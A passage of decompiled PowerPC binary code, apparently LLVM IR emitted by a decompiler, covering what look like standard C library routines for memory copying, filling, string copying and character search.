dec_label_pc_1000dc4c:                            ; preds = %dec_label_pc_1000dc3c
  %v2_1000dc50 = mul i32 %v0_1000dc3c, %v0_1000dc60
  store i32 %v2_1000dc50, i32* %r4.global-to-local, align 4
  %v2_1000dc54 = udiv i32 -1, %v0_1000dc3c
  %v0_1000dc5c = load i32, i32* @r30, align 4
  %v3_1000dc60 = icmp ugt i32 %v0_1000dc60, %v2_1000dc54
  %v1_1000dc74 = inttoptr i32 %v0_1000dc5c to i16*
  br i1 %v3_1000dc60, label %dec_label_pc_1000dc74, label %dec_label_pc_1000dc68

dec_label_pc_1000dc68:                            ; preds = %dec_label_pc_1000dc4c
  %v0_1000dc58 = load i32, i32* @r28, align 4
  store i32 268491884, i32* @lr, align 4
  %v5_1000dc68 = call i32 @function_100108e0(i32 %v0_1000dc58, i32 %v2_1000dc50, i16* %v1_1000dc74)
  %v1_1000dc6c = load i32, i32* @r29, align 4
  %v2_1000dc6c = udiv i32 %v5_1000dc68, %v1_1000dc6c
  store i32 %v2_1000dc6c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000dc98

dec_label_pc_1000dc74:                            ; preds = %dec_label_pc_1000dc4c
  %v2_1000dc74 = load i16, i16* %v1_1000dc74, align 2
  %v1_1000dc78 = or i16 %v2_1000dc74, 8
  store i16 %v1_1000dc78, i16* %v1_1000dc74, align 2
  %v0_1000dc80 = call i32 @function_1000c85c()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1000dc8c = inttoptr i32 %v0_1000dc80 to i32*
  store i32 22, i32* %v2_1000dc8c, align 4
  %v0_1000dc9c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000dc98

dec_label_pc_1000dc94:                            ; preds = %dec_label_pc_1000dc3c, %dec_label_pc_1000dc30
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000dc98

dec_label_pc_1000dc98:                            ; preds = %dec_label_pc_1000dc74, %dec_label_pc_1000dc68, %dec_label_pc_1000dc94
  %v0_1000dc9c = phi i32 [ %v0_1000dc9c.pre, %dec_label_pc_1000dc74 ], [ %v2_1000dc6c, %dec_label_pc_1000dc68 ], [ 0, %dec_label_pc_1000dc94 ]
  ret i32 %v0_1000dc9c

; uselistorder directives
  uselistorder i16* %v1_1000dc74, { 1, 2, 0 }
  uselistorder i32 %v0_1000dc3c, { 1, 0, 2 }
  uselistorder i32 %v0_1000dc60, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @function_100108e0, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_1000dc98, { 2, 0, 1 }
}

define i32 @function_1000dcb0() local_unnamed_addr {
dec_label_pc_1000dcb0:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000dcb0 = load i32, i32* @r4, align 4
  %v1_1000dcb0 = add i32 %v0_1000dcb0, -4
  store i32 %v1_1000dcb0, i32* %r4.global-to-local, align 4
  %v0_1000dcb4 = load i32, i32* @r3, align 4
  %v1_1000dcb4 = add i32 %v0_1000dcb4, -4
  store i32 %v1_1000dcb4, i32* @r11, align 4
  %v0_1000dcb8 = load i32, i32* @r5, align 4
  %v1_1000dcb8 = call i32 @__asm_rlwinm.(i32 %v0_1000dcb8, i32 29, i32 3, i32 31)
  store i32 %v1_1000dcb8, i32* %r9.global-to-local, align 4
  %v4_1000dcb8 = icmp eq i32 %v1_1000dcb8, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000dcb8, label %dec_label_pc_1000dce0, label %dec_label_pc_1000dcc0

dec_label_pc_1000dcc0:                            ; preds = %dec_label_pc_1000dcb0
  %v0_1000dcc0 = load i32, i32* @r11, align 4
  %v1_1000dcc0 = urem i32 %v0_1000dcc0, 4
  %v3_1000dcc0 = icmp eq i32 %v1_1000dcc0, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000dcc0, label %dec_label_pc_1000dcc8, label %dec_label_pc_1000dd1c

dec_label_pc_1000dcc8:                            ; preds = %dec_label_pc_1000dd3c.dec_label_pc_1000dcc8_crit_edge, %dec_label_pc_1000dcc0
  %v1_1000dcd4.pre = phi i32 [ %v0_1000dcc0, %dec_label_pc_1000dcc0 ], [ %v1_1000dcd4.pre.pre, %dec_label_pc_1000dd3c.dec_label_pc_1000dcc8_crit_edge ]
  %v0_1000dcc8 = phi i32 [ %v1_1000dcb8, %dec_label_pc_1000dcc0 ], [ %v1_1000dd3c, %dec_label_pc_1000dd3c.dec_label_pc_1000dcc8_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000dcc0 ], [ %v2_1000dd24, %dec_label_pc_1000dd3c.dec_label_pc_1000dcc8_crit_edge ]
  store i32 %v0_1000dcc8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000dccc

dec_label_pc_1000dccc:                            ; preds = %dec_label_pc_1000dccc, %dec_label_pc_1000dcc8
  %v1_1000dcd4 = phi i32 [ %v2_1000dcd8, %dec_label_pc_1000dccc ], [ %v1_1000dcd4.pre, %dec_label_pc_1000dcc8 ]
  %v0_1000dccc = load i32, i32* %r4.global-to-local, align 4
  %v1_1000dccc = add i32 %v0_1000dccc, 4
  %v2_1000dccc = inttoptr i32 %v1_1000dccc to i32*
  %v3_1000dccc = load i32, i32* %v2_1000dccc, align 4
  %v1_1000dcd0 = add i32 %v0_1000dccc, 8
  %v2_1000dcd0 = inttoptr i32 %v1_1000dcd0 to i32*
  %v3_1000dcd0 = load i32, i32* %v2_1000dcd0, align 4
  store i32 %v3_1000dcd0, i32* %r9.global-to-local, align 4
  store i32 %v1_1000dcd0, i32* %r4.global-to-local, align 4
  %v2_1000dcd4 = add i32 %v1_1000dcd4, 4
  %v3_1000dcd4 = inttoptr i32 %v2_1000dcd4 to i32*
  store i32 %v3_1000dccc, i32* %v3_1000dcd4, align 4
  %v0_1000dcd8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000dcd8 = load i32, i32* @r11, align 4
  %v2_1000dcd8 = add i32 %v1_1000dcd8, 8
  %v3_1000dcd8 = inttoptr i32 %v2_1000dcd8 to i32*
  store i32 %v0_1000dcd8, i32* %v3_1000dcd8, align 4
  store i32 %v2_1000dcd8, i32* @r11, align 4
  %v0_1000dcdc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dcdc = add i32 %v0_1000dcdc, -1
  store i32 %v1_1000dcdc, i32* %ctr.global-to-local, align 4
  %v2_1000dcdc = icmp eq i32 %v1_1000dcdc, 0
  br i1 %v2_1000dcdc, label %dec_label_pc_1000dce0, label %dec_label_pc_1000dccc

dec_label_pc_1000dce0:                            ; preds = %dec_label_pc_1000dccc, %dec_label_pc_1000dd3c, %dec_label_pc_1000dcb0
  %.1 = phi i32 [ undef, %dec_label_pc_1000dcb0 ], [ %v2_1000dd24, %dec_label_pc_1000dd3c ], [ %.0, %dec_label_pc_1000dccc ]
  %v1_1000dce0 = urem i32 %.1, 8
  store i32 %v1_1000dce0, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000dce0, 4
  br i1 %tmp, label %dec_label_pc_1000dcf8, label %dec_label_pc_1000dcec

dec_label_pc_1000dcec:                            ; preds = %dec_label_pc_1000dce0
  %v0_1000dcec = load i32, i32* %r4.global-to-local, align 4
  %v1_1000dcec = add i32 %v0_1000dcec, 4
  %v2_1000dcec = inttoptr i32 %v1_1000dcec to i32*
  %v3_1000dcec = load i32, i32* %v2_1000dcec, align 4
  store i32 %v1_1000dcec, i32* %r4.global-to-local, align 4
  %v1_1000dcf0 = add nsw i32 %v1_1000dce0, -4
  store i32 %v1_1000dcf0, i32* @r5, align 4
  %v1_1000dcf4 = load i32, i32* @r11, align 4
  %v2_1000dcf4 = add i32 %v1_1000dcf4, 4
  %v3_1000dcf4 = inttoptr i32 %v2_1000dcf4 to i32*
  store i32 %v3_1000dcec, i32* %v3_1000dcf4, align 4
  store i32 %v2_1000dcf4, i32* @r11, align 4
  %v0_1000dcf8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000dcf8

dec_label_pc_1000dcf8:                            ; preds = %dec_label_pc_1000dce0, %dec_label_pc_1000dcec
  %v0_1000dcf8 = phi i32 [ %v1_1000dce0, %dec_label_pc_1000dce0 ], [ %v0_1000dcf8.pre, %dec_label_pc_1000dcec ]
  %v3_1000dcf8 = icmp eq i32 %v0_1000dcf8, 0
  %v0_1000dcfc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000dcf8, i32 %v0_1000dcfc)
  %v0_1000dd00 = load i32, i32* @r5, align 4
  store i32 %v0_1000dd00, i32* %ctr.global-to-local, align 4
  %v0_1000dd04 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000dd04 = add i32 %v0_1000dd04, 3
  store i32 %v1_1000dd04, i32* %r4.global-to-local, align 4
  %v0_1000dd08 = load i32, i32* @r11, align 4
  %v1_1000dd08 = add i32 %v0_1000dd08, 3
  store i32 %v1_1000dd08, i32* %r9.global-to-local, align 4
  %v1_1000dd0c8 = add i32 %v0_1000dd04, 4
  %v2_1000dd0c9 = inttoptr i32 %v1_1000dd0c8 to i8*
  %v3_1000dd0c10 = load i8, i8* %v2_1000dd0c9, align 1
  store i32 %v1_1000dd0c8, i32* %r4.global-to-local, align 4
  %v3_1000dd1012 = add i32 %v0_1000dd08, 4
  %v4_1000dd1013 = inttoptr i32 %v3_1000dd1012 to i8*
  store i8 %v3_1000dd0c10, i8* %v4_1000dd1013, align 1
  store i32 %v3_1000dd1012, i32* %r9.global-to-local, align 4
  %v0_1000dd1414 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dd1415 = add i32 %v0_1000dd1414, -1
  store i32 %v1_1000dd1415, i32* %ctr.global-to-local, align 4
  %v2_1000dd1416 = icmp eq i32 %v1_1000dd1415, 0
  br i1 %v2_1000dd1416, label %dec_label_pc_1000dd48, label %dec_label_pc_1000dd0c.dec_label_pc_1000dd0c_crit_edge

dec_label_pc_1000dd0c.dec_label_pc_1000dd0c_crit_edge: ; preds = %dec_label_pc_1000dcf8, %dec_label_pc_1000dd0c.dec_label_pc_1000dd0c_crit_edge
  %v3_1000dd1017 = phi i32 [ %v3_1000dd10, %dec_label_pc_1000dd0c.dec_label_pc_1000dd0c_crit_edge ], [ %v3_1000dd1012, %dec_label_pc_1000dcf8 ]
  %v0_1000dd0c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000dd0c = add i32 %v0_1000dd0c.pre, 1
  %v2_1000dd0c = inttoptr i32 %v1_1000dd0c to i8*
  %v3_1000dd0c = load i8, i8* %v2_1000dd0c, align 1
  store i32 %v1_1000dd0c, i32* %r4.global-to-local, align 4
  %v3_1000dd10 = add i32 %v3_1000dd1017, 1
  %v4_1000dd10 = inttoptr i32 %v3_1000dd10 to i8*
  store i8 %v3_1000dd0c, i8* %v4_1000dd10, align 1
  store i32 %v3_1000dd10, i32* %r9.global-to-local, align 4
  %v0_1000dd14 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dd14 = add i32 %v0_1000dd14, -1
  store i32 %v1_1000dd14, i32* %ctr.global-to-local, align 4
  %v2_1000dd14 = icmp eq i32 %v1_1000dd14, 0
  br i1 %v2_1000dd14, label %dec_label_pc_1000dd48, label %dec_label_pc_1000dd0c.dec_label_pc_1000dd0c_crit_edge

dec_label_pc_1000dd1c:                            ; preds = %dec_label_pc_1000dcc0
  %v1_1000dd1c = sub nsw i32 4, %v1_1000dcc0
  store i32 %v1_1000dd1c, i32* %ctr.global-to-local, align 4
  %v1_1000dd24 = load i32, i32* @r5, align 4
  %v2_1000dd24 = sub i32 %v1_1000dd24, %v1_1000dd1c
  br label %dec_label_pc_1000dd28

dec_label_pc_1000dd28:                            ; preds = %dec_label_pc_1000dd28, %dec_label_pc_1000dd1c
  %v2_1000dd30 = phi i32 [ %v1_1000dd34, %dec_label_pc_1000dd28 ], [ %v0_1000dcc0, %dec_label_pc_1000dd1c ]
  %v0_1000dd28 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000dd28 = add i32 %v0_1000dd28, 4
  %v2_1000dd28 = inttoptr i32 %v1_1000dd28 to i8*
  %v3_1000dd28 = load i8, i8* %v2_1000dd28, align 1
  %v1_1000dd2c = add i32 %v0_1000dd28, 1
  store i32 %v1_1000dd2c, i32* %r4.global-to-local, align 4
  %v3_1000dd30 = add i32 %v2_1000dd30, 4
  %v4_1000dd30 = inttoptr i32 %v3_1000dd30 to i8*
  store i8 %v3_1000dd28, i8* %v4_1000dd30, align 1
  %v0_1000dd34 = load i32, i32* @r11, align 4
  %v1_1000dd34 = add i32 %v0_1000dd34, 1
  store i32 %v1_1000dd34, i32* @r11, align 4
  %v0_1000dd38 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dd38 = add i32 %v0_1000dd38, -1
  store i32 %v1_1000dd38, i32* %ctr.global-to-local, align 4
  %v2_1000dd38 = icmp eq i32 %v1_1000dd38, 0
  br i1 %v2_1000dd38, label %dec_label_pc_1000dd3c, label %dec_label_pc_1000dd28

dec_label_pc_1000dd3c:                            ; preds = %dec_label_pc_1000dd28
  %v1_1000dd3c = call i32 @__asm_rlwinm.(i32 %v2_1000dd24, i32 29, i32 3, i32 31)
  store i32 %v1_1000dd3c, i32* %r9.global-to-local, align 4
  %v4_1000dd3c = icmp eq i32 %v1_1000dd3c, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000dd3c, label %dec_label_pc_1000dce0, label %dec_label_pc_1000dd3c.dec_label_pc_1000dcc8_crit_edge

dec_label_pc_1000dd3c.dec_label_pc_1000dcc8_crit_edge: ; preds = %dec_label_pc_1000dd3c
  %v1_1000dcd4.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000dcc8

dec_label_pc_1000dd48:                            ; preds = %dec_label_pc_1000dd0c.dec_label_pc_1000dd0c_crit_edge, %dec_label_pc_1000dcf8
  %v0_1000dd48 = load i32, i32* @r3, align 4
  ret i32 %v0_1000dd48

; uselistorder directives
  uselistorder i32 %v1_1000dd3c, { 1, 2, 0 }
  uselistorder i32 %v1_1000dd38, { 1, 0 }
  uselistorder i32 %v1_1000dd34, { 1, 0 }
  uselistorder i32 %v2_1000dd24, { 2, 1, 0 }
  uselistorder i32 %v1_1000dd14, { 1, 0 }
  uselistorder i32 %v3_1000dd10, { 1, 2, 0 }
  uselistorder i32 %v1_1000dce0, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000dcdc, { 1, 0 }
  uselistorder i32 %v2_1000dcd8, { 1, 2, 0 }
  uselistorder i32 %v1_1000dcc0, { 1, 0 }
  uselistorder i32 %v0_1000dcc0, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 7, 3, 2, 0, 4, 8, 5, 10, 6, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000dd0c.dec_label_pc_1000dd0c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000dcf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000dce0, { 1, 0, 2 }
}

define i32 @function_1000dd4c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000dd4c:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000dd50 = add i32 %arg1, -4
  store i32 %v1_1000dd50, i32* %r11.global-to-local, align 4
  %v1_1000dd54 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000dd58 = call i32 @__asm_rlwimi(i32 %v1_1000dd54, i32 16, i32 0, i32 15)
  %v2_1000dd58 = trunc i32 %v1_1000dd58 to i8
  %v1_1000dd5c = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000dd5c, i32* %r9.global-to-local, align 4
  %v4_1000dd5c = icmp eq i32 %v1_1000dd5c, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000dd5c, label %dec_label_pc_1000dd84, label %dec_label_pc_1000dd64

dec_label_pc_1000dd64:                            ; preds = %dec_label_pc_1000dd4c
  %v0_1000dd64 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000dd64 = urem i32 %v0_1000dd64, 4
  %v3_1000dd64 = icmp eq i32 %v1_1000dd64, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000dd64, label %dec_label_pc_1000dd6c, label %dec_label_pc_1000ddb4

dec_label_pc_1000dd6c:                            ; preds = %dec_label_pc_1000ddcc.dec_label_pc_1000dd6c_crit_edge, %dec_label_pc_1000dd64
  %v0_1000dd70.pre = phi i32 [ %v0_1000dd70.pre.pre, %dec_label_pc_1000ddcc.dec_label_pc_1000dd6c_crit_edge ], [ %v0_1000dd64, %dec_label_pc_1000dd64 ]
  %v0_1000dd6c = phi i32 [ %v1_1000ddcc, %dec_label_pc_1000ddcc.dec_label_pc_1000dd6c_crit_edge ], [ %v1_1000dd5c, %dec_label_pc_1000dd64 ]
  store i32 %v0_1000dd6c, i32* %ctr.global-to-local, align 4
  %v1_1000dd74 = sext i8 %v2_1000dd58 to i32
  br label %dec_label_pc_1000dd70

dec_label_pc_1000dd70:                            ; preds = %dec_label_pc_1000dd70, %dec_label_pc_1000dd6c
  %v0_1000dd70 = phi i32 [ %v1_1000dd7c, %dec_label_pc_1000dd70 ], [ %v0_1000dd70.pre, %dec_label_pc_1000dd6c ]
  %v1_1000dd70 = add i32 %v0_1000dd70, 4
  store i32 %v1_1000dd70, i32* %r9.global-to-local, align 4
  %v4_1000dd74 = inttoptr i32 %v1_1000dd70 to i32*
  store i32 %v1_1000dd74, i32* %v4_1000dd74, align 4
  %v2_1000dd78 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000dd78 = add i32 %v2_1000dd78, 4
  %v4_1000dd78 = inttoptr i32 %v3_1000dd78 to i32*
  store i32 %v1_1000dd74, i32* %v4_1000dd78, align 4
  %v0_1000dd7c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000dd7c = add i32 %v0_1000dd7c, 4
  store i32 %v1_1000dd7c, i32* %r11.global-to-local, align 4
  %v0_1000dd80 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dd80 = add i32 %v0_1000dd80, -1
  store i32 %v1_1000dd80, i32* %ctr.global-to-local, align 4
  %v2_1000dd80 = icmp eq i32 %v1_1000dd80, 0
  br i1 %v2_1000dd80, label %dec_label_pc_1000dd84, label %dec_label_pc_1000dd70

dec_label_pc_1000dd84:                            ; preds = %dec_label_pc_1000dd70, %dec_label_pc_1000ddcc, %dec_label_pc_1000dd4c
  %v0_1000dd84 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000dd84 = urem i32 %v0_1000dd84, 8
  store i32 %v1_1000dd84, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000dd84, 4
  br i1 %tmp, label %dec_label_pc_1000dd98, label %dec_label_pc_1000dd90

dec_label_pc_1000dd90:                            ; preds = %dec_label_pc_1000dd84
  %v1_1000dd90 = sext i8 %v2_1000dd58 to i32
  %v2_1000dd90 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000dd90 = add i32 %v2_1000dd90, 4
  %v4_1000dd90 = inttoptr i32 %v3_1000dd90 to i32*
  store i32 %v1_1000dd90, i32* %v4_1000dd90, align 4
  store i32 %v3_1000dd90, i32* %r11.global-to-local, align 4
  %v0_1000dd94 = load i32, i32* @r5, align 4
  %v1_1000dd94 = add i32 %v0_1000dd94, -4
  store i32 %v1_1000dd94, i32* @r5, align 4
  br label %dec_label_pc_1000dd98

dec_label_pc_1000dd98:                            ; preds = %dec_label_pc_1000dd84, %dec_label_pc_1000dd90
  %v0_1000dd98 = phi i32 [ %v1_1000dd84, %dec_label_pc_1000dd84 ], [ %v1_1000dd94, %dec_label_pc_1000dd90 ]
  %v3_1000dd98 = icmp eq i32 %v0_1000dd98, 0
  %v0_1000dd9c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000dd98, i32 %v0_1000dd9c)
  %v0_1000dda0 = load i32, i32* @r5, align 4
  store i32 %v0_1000dda0, i32* %ctr.global-to-local, align 4
  %v0_1000dda4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000dda4 = add i32 %v0_1000dda4, 3
  store i32 %v1_1000dda4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000dda8

dec_label_pc_1000dda8:                            ; preds = %dec_label_pc_1000dda8, %dec_label_pc_1000dd98
  %v3_1000dda8 = phi i32 [ %v4_1000dda8, %dec_label_pc_1000dda8 ], [ %v1_1000dda4, %dec_label_pc_1000dd98 ]
  %v4_1000dda8 = add i32 %v3_1000dda8, 1
  %v5_1000dda8 = inttoptr i32 %v4_1000dda8 to i8*
  store i8 %v2_1000dd58, i8* %v5_1000dda8, align 1
  store i32 %v4_1000dda8, i32* %r9.global-to-local, align 4
  %v0_1000ddac = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ddac = add i32 %v0_1000ddac, -1
  store i32 %v1_1000ddac, i32* %ctr.global-to-local, align 4
  %v2_1000ddac = icmp eq i32 %v1_1000ddac, 0
  br i1 %v2_1000ddac, label %dec_label_pc_1000ddd8, label %dec_label_pc_1000dda8

dec_label_pc_1000ddb4:                            ; preds = %dec_label_pc_1000dd64
  %v1_1000ddb4 = sub nsw i32 4, %v1_1000dd64
  store i32 %v1_1000ddb4, i32* %ctr.global-to-local, align 4
  %v1_1000ddbc = load i32, i32* %r5.global-to-local, align 4
  %v2_1000ddbc = sub i32 %v1_1000ddbc, %v1_1000ddb4
  store i32 %v2_1000ddbc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ddc0

dec_label_pc_1000ddc0:                            ; preds = %dec_label_pc_1000ddc0, %dec_label_pc_1000ddb4
  %v3_1000ddc0 = phi i32 [ %v1_1000ddc4, %dec_label_pc_1000ddc0 ], [ %v0_1000dd64, %dec_label_pc_1000ddb4 ]
  %v4_1000ddc0 = add i32 %v3_1000ddc0, 4
  %v5_1000ddc0 = inttoptr i32 %v4_1000ddc0 to i8*
  store i8 %v2_1000dd58, i8* %v5_1000ddc0, align 1
  %v0_1000ddc4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ddc4 = add i32 %v0_1000ddc4, 1
  store i32 %v1_1000ddc4, i32* %r11.global-to-local, align 4
  %v0_1000ddc8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ddc8 = add i32 %v0_1000ddc8, -1
  store i32 %v1_1000ddc8, i32* %ctr.global-to-local, align 4
  %v2_1000ddc8 = icmp eq i32 %v1_1000ddc8, 0
  br i1 %v2_1000ddc8, label %dec_label_pc_1000ddcc, label %dec_label_pc_1000ddc0

dec_label_pc_1000ddcc:                            ; preds = %dec_label_pc_1000ddc0
  %v0_1000ddcc = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ddcc = call i32 @__asm_rlwinm.(i32 %v0_1000ddcc, i32 29, i32 3, i32 31)
  store i32 %v1_1000ddcc, i32* %r9.global-to-local, align 4
  %v4_1000ddcc = icmp eq i32 %v1_1000ddcc, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000ddcc, label %dec_label_pc_1000dd84, label %dec_label_pc_1000ddcc.dec_label_pc_1000dd6c_crit_edge

dec_label_pc_1000ddcc.dec_label_pc_1000dd6c_crit_edge: ; preds = %dec_label_pc_1000ddcc
  %v0_1000dd70.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000dd6c

dec_label_pc_1000ddd8:                            ; preds = %dec_label_pc_1000dda8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000ddcc, { 1, 2, 0 }
  uselistorder i32 %v1_1000ddc8, { 1, 0 }
  uselistorder i32 %v1_1000ddc4, { 1, 0 }
  uselistorder i32 %v1_1000ddac, { 1, 0 }
  uselistorder i32 %v4_1000dda8, { 1, 2, 0 }
  uselistorder i32 %v1_1000dd84, { 2, 1, 0 }
  uselistorder i32 %v1_1000dd80, { 1, 0 }
  uselistorder i32 %v1_1000dd7c, { 1, 0 }
  uselistorder i32 %v1_1000dd64, { 1, 0 }
  uselistorder i32 %v0_1000dd64, { 2, 1, 0 }
  uselistorder i8 %v2_1000dd58, { 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000dd98, { 1, 0 }
  uselistorder label %dec_label_pc_1000dd84, { 1, 0, 2 }
}

define i32 @function_1000dddc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000dddc:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_1000dde0

dec_label_pc_1000dde0:                            ; preds = %dec_label_pc_1000dde0, %dec_label_pc_1000dddc
  %v0_1000dde0 = phi i32 [ %v1_1000dde4, %dec_label_pc_1000dde0 ], [ %tmp, %dec_label_pc_1000dddc ]
  %v1_1000dde0 = inttoptr i32 %v0_1000dde0 to i8*
  %v2_1000dde0 = load i8, i8* %v1_1000dde0, align 1
  %v1_1000dde4 = add i32 %v0_1000dde0, 1
  %v3_1000dde8 = icmp eq i8 %v2_1000dde0, 0
  store i1 %v3_1000dde8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000dde8, label %dec_label_pc_1000ddf0, label %dec_label_pc_1000dde0

dec_label_pc_1000ddf0:                            ; preds = %dec_label_pc_1000dde0
  %v1_1000ddf0 = add i32 %v0_1000dde0, -1
  br label %dec_label_pc_1000ddf4

dec_label_pc_1000ddf4:                            ; preds = %dec_label_pc_1000ddf4, %dec_label_pc_1000ddf0
  %v2_1000de00 = phi i32 [ %v3_1000de00, %dec_label_pc_1000ddf4 ], [ %v1_1000ddf0, %dec_label_pc_1000ddf0 ]
  %v0_1000ddf4 = load i32, i32* @r4, align 4
  %v1_1000ddf4 = inttoptr i32 %v0_1000ddf4 to i8*
  %v2_1000ddf4 = load i8, i8* %v1_1000ddf4, align 1
  %v1_1000ddf8 = add i32 %v0_1000ddf4, 1
  store i32 %v1_1000ddf8, i32* @r4, align 4
  %v3_1000ddfc = icmp eq i8 %v2_1000ddf4, 0
  store i1 %v3_1000ddfc, i1* %cr7_eq.global-to-local, align 1
  %v3_1000de00 = add i32 %v2_1000de00, 1
  %v4_1000de00 = inttoptr i32 %v3_1000de00 to i8*
  store i8 %v2_1000ddf4, i8* %v4_1000de00, align 1
  %v0_1000de04 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000de04, label %dec_label_pc_1000de08, label %dec_label_pc_1000ddf4

dec_label_pc_1000de08:                            ; preds = %dec_label_pc_1000ddf4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_1000de00, { 1, 0 }
  uselistorder i32 %v0_1000dde0, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @function_1000de0c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000de0c:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000de0c = urem i32 %arg1, 256
  store i32 %v1_1000de0c, i32* %r4.global-to-local, align 4
  %v0_1000de2c2 = load i32, i32* @r3, align 4
  %v1_1000de2c3 = urem i32 %v0_1000de2c2, 4
  %v3_1000de2c5 = icmp eq i32 %v1_1000de2c3, 0
  br i1 %v3_1000de2c5, label %dec_label_pc_1000de34, label %dec_label_pc_1000de14

dec_label_pc_1000de14:                            ; preds = %dec_label_pc_1000de0c, %dec_label_pc_1000de28
  %v1_1000de18 = phi i32 [ %v0_1000de34.pre, %dec_label_pc_1000de28 ], [ %v1_1000de0c, %dec_label_pc_1000de0c ]
  %v0_1000de14 = phi i32 [ %v1_1000de28, %dec_label_pc_1000de28 ], [ %v0_1000de2c2, %dec_label_pc_1000de0c ]
  %v1_1000de14 = inttoptr i32 %v0_1000de14 to i8*
  %v2_1000de14 = load i8, i8* %v1_1000de14, align 1
  %v3_1000de14 = zext i8 %v2_1000de14 to i32
  %v4_1000de18 = icmp eq i32 %v3_1000de14, %v1_1000de18
  %v3_1000de1c = icmp eq i8 %v2_1000de14, 0
  %v0_1000de20 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000de18, i32 %v0_1000de20)
  br i1 %v3_1000de1c, label %dec_label_pc_1000df04, label %dec_label_pc_1000de28

dec_label_pc_1000de28:                            ; preds = %dec_label_pc_1000de14
  %v0_1000de28 = load i32, i32* @r3, align 4
  %v1_1000de28 = add i32 %v0_1000de28, 1
  store i32 %v1_1000de28, i32* @r3, align 4
  %v1_1000de2c = urem i32 %v1_1000de28, 4
  %v3_1000de2c = icmp eq i32 %v1_1000de2c, 0
  %v0_1000de34.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000de2c, label %dec_label_pc_1000de34, label %dec_label_pc_1000de14

dec_label_pc_1000de34:                            ; preds = %dec_label_pc_1000de28, %dec_label_pc_1000de0c
